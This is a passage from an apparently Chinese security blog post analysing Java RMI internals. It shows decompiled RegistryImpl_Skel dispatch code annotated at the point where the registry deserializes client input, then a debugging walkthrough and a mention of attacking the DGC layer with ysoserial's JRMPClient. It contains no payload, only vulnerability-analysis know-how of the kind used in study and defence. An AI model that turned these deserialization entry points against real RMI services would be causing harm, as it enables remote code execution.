</span><span class="lnt" id="50"><span class="lnlinks"> 50</span>
</span><span class="lnt" id="51"><span class="lnlinks"> 51</span>
</span><span class="lnt" id="52"><span class="lnlinks"> 52</span>
</span><span class="lnt" id="53"><span class="lnlinks"> 53</span>
</span><span class="lnt" id="54"><span class="lnlinks"> 54</span>
</span><span class="lnt" id="55"><span class="lnlinks"> 55</span>
</span><span class="lnt" id="56"><span class="lnlinks"> 56</span>
</span><span class="lnt" id="57"><span class="lnlinks"> 57</span>
</span><span class="lnt" id="58"><span class="lnlinks"> 58</span>
</span><span class="lnt" id="59"><span class="lnlinks"> 59</span>
</span><span class="lnt" id="60"><span class="lnlinks"> 60</span>
</span><span class="lnt" id="61"><span class="lnlinks"> 61</span>
</span><span class="lnt" id="62"><span class="lnlinks"> 62</span>
</span><span class="lnt" id="63"><span class="lnlinks"> 63</span>
</span><span class="lnt" id="64"><span class="lnlinks"> 64</span>
</span><span class="lnt" id="65"><span class="lnlinks"> 65</span>
</span><span class="lnt" id="66"><span class="lnlinks"> 66</span>
</span><span class="lnt" id="67"><span class="lnlinks"> 67</span>
</span><span class="lnt" id="68"><span class="lnlinks"> 68</span>
</span><span class="lnt" id="69"><span class="lnlinks"> 69</span>
</span><span class="lnt" id="70"><span class="lnlinks"> 70</span>
</span><span class="lnt" id="71"><span class="lnlinks"> 71</span>
</span><span class="lnt" id="72"><span class="lnlinks"> 72</span>
</span><span class="lnt" id="73"><span class="lnlinks"> 73</span>
</span><span class="lnt" id="74"><span class="lnlinks"> 74</span>
</span><span class="lnt" id="75"><span class="lnlinks"> 75</span>
</span><span class="lnt" id="76"><span class="lnlinks"> 76</span>
</span><span class="lnt" id="77"><span class="lnlinks"> 77</span>
</span><span class="lnt" id="78"><span class="lnlinks"> 78</span>
</span><span class="lnt" id="79"><span class="lnlinks"> 79</span>
</span><span class="lnt" id="80"><span class="lnlinks"> 80</span>
</span><span class="lnt" id="81"><span class="lnlinks"> 81</span>
</span><span class="lnt" id="82"><span class="lnlinks"> 82</span>
</span><span class="lnt" id="83"><span class="lnlinks"> 83</span>
</span><span class="lnt" id="84"><span class="lnlinks"> 84</span>
</span><span class="lnt" id="85"><span class="lnlinks"> 85</span>
</span><span class="lnt" id="86"><span class="lnlinks"> 86</span>
</span><span class="lnt" id="87"><span class="lnlinks"> 87</span>
</span><span class="lnt" id="88"><span class="lnlinks"> 88</span>
</span><span class="lnt" id="89"><span class="lnlinks"> 89</span>
</span><span class="lnt" id="90"><span class="lnlinks"> 90</span>
</span><span class="lnt" id="91"><span class="lnlinks"> 91</span>
</span><span class="lnt" id="92"><span class="lnlinks"> 92</span>
</span><span class="lnt" id="93"><span class="lnlinks"> 93</span>
</span><span class="lnt" id="94"><span class="lnlinks"> 94</span>
</span><span class="lnt" id="95"><span class="lnlinks"> 95</span>
</span><span class="lnt" id="96"><span class="lnlinks"> 96</span>
</span><span class="lnt" id="97"><span class="lnlinks"> 97</span>
</span><span class="lnt" id="98"><span class="lnlinks"> 98</span>
</span><span class="lnt" id="99"><span class="lnlinks"> 99</span>
</span><span class="lnt" id="100"><span class="lnlinks">100</span>
</span><span class="lnt" id="101"><span class="lnlinks">101</span>
</span><span class="lnt" id="102"><span class="lnlinks">102</span>
</span><span class="lnt" id="103"><span class="lnlinks">103</span>
</span><span class="lnt" id="104"><span class="lnlinks">104</span>
</span><span class="lnt" id="105"><span class="lnlinks">105</span>
</span><span class="lnt" id="106"><span class="lnlinks">106</span>
</span><span class="lnt" id="107"><span class="lnlinks">107</span>
</span><span class="lnt" id="108"><span class="lnlinks">108</span>
</span><span class="lnt" id="109"><span class="lnlinks">109</span>
</span><span class="lnt" id="110"><span class="lnlinks">110</span>
</span><span class="lnt" id="111"><span class="lnlinks">111</span>
</span><span class="lnt" id="112"><span class="lnlinks">112</span>
</span><span class="lnt" id="113"><span class="lnlinks">113</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">dispatch</span><span class="p">(</span><span class="n">Remote</span><span class="w"> </span><span class="n">var1</span><span class="p">,</span><span class="w"> </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var2</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">var3</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">var4</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var4</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">4905912898345647071L</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SkeletonMismatchException</span><span class="p">(</span><span class="s">&#34;interface hash mismatch&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RegistryImpl</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RegistryImpl</span><span class="p">)</span><span class="n">var1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">var3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">var100</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Remote</span><span class="w"> </span><span class="n">var103</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var105</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var100</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var105</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var103</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Remote</span><span class="p">)</span><span class="n">var105</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var94</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var94</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var95</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var95</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var6</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="n">var100</span><span class="p">,</span><span class="w"> </span><span class="n">var103</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var93</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var93</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">1</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">var99</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var6</span><span class="p">.</span><span class="na">list</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var102</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var102</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var99</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var92</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var92</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">2</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">var98</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var104</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">//此处为注册中心，直接调用了反序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var98</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var104</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var89</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var89</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var90</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var90</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Remote</span><span class="w"> </span><span class="n">var101</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var6</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="n">var98</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var9</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var101</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var88</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var88</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">3</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Remote</span><span class="w"> </span><span class="n">var8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">var97</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var97</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var11</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Remote</span><span class="p">)</span><span class="n">var11</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var85</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var85</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var86</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var86</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var6</span><span class="p">.</span><span class="na">rebind</span><span class="p">(</span><span class="n">var97</span><span class="p">,</span><span class="w"> </span><span class="n">var8</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var84</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var84</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">4</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">var7</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var10</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var81</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var81</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var82</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var82</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var6</span><span class="p">.</span><span class="na">unbind</span><span class="p">(</span><span class="n">var7</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var80</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var80</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">default</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;invalid method number&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="总结-注册中心产生的漏洞点">总结-注册中心产生的漏洞点<a hidden class="anchor" aria-hidden="true" href="#总结-注册中心产生的漏洞点">#</a></h4>
<ol>
<li>客户端在请求时 （<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>），<code>lookup</code>的对象是序列化后传到注册中心的，而注册中心的 **RegistryImpl_Skel **中，大部分 case 的函数都有反序列化。如果是一个恶意序列化对象，在注册中心运行到 **RegistryImpl_Skel **时，会产生反序列化漏洞 <code>var98 = (String)var104.readObject();</code></li>
</ol>
<h3 id="36-服务端-客户端请求时">3.6 服务端-客户端请求时<a hidden class="anchor" aria-hidden="true" href="#36-服务端-客户端请求时">#</a></h3>
<p>过程和注册中心被客户端请求时一样，但要注意，调试的时候需要代理是动态代理，按 F9 让程序往下运行直到得到动态代理。</p>
<p>图中的 RegistryImpl_Stub   DGCImpl_Stub 都不是想要的</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png" style="max-width: 100%; height: auto;"></p>
<p>最终拿到的 $Proxy0 是我们需要的动态代理</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png" style="max-width: 100%; height: auto;"></p>
<p>同样来到 disp.dispatch</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png" style="max-width: 100%; height: auto;"></p>
<p>不一样的是在 <code>skel != null</code>判断时，此时的 skel 为空，不进入 oldDispatch</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png" style="max-width: 100%; height: auto;"></p>
<p>继续走，获取远程方法 sayHello</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png" style="max-width: 100%; height: auto;"></p>
<p>之后会进入 <!-- raw HTML omitted -->unmarshalValue，在 客户端产生的反序列化漏洞点 中也有 unmarshalValue<!-- raw HTML omitted --></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png" style="max-width: 100%; height: auto;"></p>
<p>最终在 <code>result = method.invoke(obj, params);</code><!-- raw HTML omitted --> 这一步完成远程调用<!-- raw HTML omitted --></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png" style="max-width: 100%; height: auto;"></p>
<h3 id="37-dgc-客户端请求服务端">3.7 DGC-客户端请求服务端<a hidden class="anchor" aria-hidden="true" href="#37-dgc-客户端请求服务端">#</a></h3>
<blockquote>
<p><!-- raw HTML omitted -->分布式垃圾回收，又称DGC，RMI使用DGC来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。<!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted -->而既然RMI依赖于DGC做垃圾回收，那么在RMI服务中必然会有DGC层，在yso中攻击DGC层对应的是JRMPClient，在攻击RMI Registry小节中提到了skel和stub对应的Registry的服务端和客户端，同样的，DGC层中也会有skel和stub对应的代码，也就是DGCImpl_Skel和DGCImpl_Stub，我们可以直接从此处分析，避免冗长的debug。<!-- raw HTML omitted --></p>
